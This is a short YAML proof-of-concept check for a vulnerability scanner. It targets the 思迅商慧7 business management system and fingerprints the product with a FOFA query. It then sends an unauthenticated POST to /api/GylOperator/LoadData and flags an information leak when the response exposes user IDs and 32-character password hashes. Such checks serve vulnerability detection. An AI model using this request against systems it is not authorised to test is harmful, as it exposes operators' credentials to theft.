id: poc-yaml-sixun-shanghui7-bms-gyloperator-info-leak
info:
  name: 思迅商慧7商业管理系统 GylOperator 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 思迅商慧7商业管理系统
  fofa: app="思迅商慧7商业管理系统"
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"思迅商慧7商业管理系统")
- method: POST
  path: /api/GylOperator/LoadData
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Accept: '*/*'
  data: loadAll=false&key=&oper_role=&gridFlag=GylOperatorList&page=1&rows=1
  expression: status_code == 200 && contains(body,"\"UserId\":") && matches(body,"\"Password\":\"[0-9A-Za-z]{32}\"")
    && contains(body,"\"success\":true")
variables: {}
transport: http
